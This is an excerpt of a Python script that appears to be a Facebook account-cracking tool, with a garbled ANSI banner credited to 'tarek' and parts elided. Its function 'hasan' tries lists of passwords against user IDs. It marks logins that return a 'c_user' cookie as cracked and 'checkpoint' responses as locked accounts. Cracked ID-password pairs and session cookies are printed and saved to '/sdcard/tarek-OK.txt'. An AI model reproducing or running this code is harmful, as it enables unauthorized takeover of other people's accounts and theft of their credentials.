...
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™‰ð˜¼ð™ˆð™€\33[38;5;196m        : [â˜…]tarek\33[38;5;196m                                        â”ƒ
\33[38;5;196m     â”ƒ \033[38;5;46mâ£ï¸Ž[ð–£˜]â˜”ï¸Ž\x1b[1;96mð™ð˜¼ð˜¾ð™€ð˜½ð™Šð™Šð™†\33[38;5;196m    : [â˜…]tarek\33[38;5;196m                                  â”ƒ
...
def fuck():
    ...
    print(' [✓] OK Ids saved as tarek-OK.txt')
    print(' [✓] CP Id Save as tarek-CP.txt')
    print('-------------------')
def hasan(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[tarek]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[tarek-OK] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/tarek-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[tarek-CP] {cid}|{ps}")
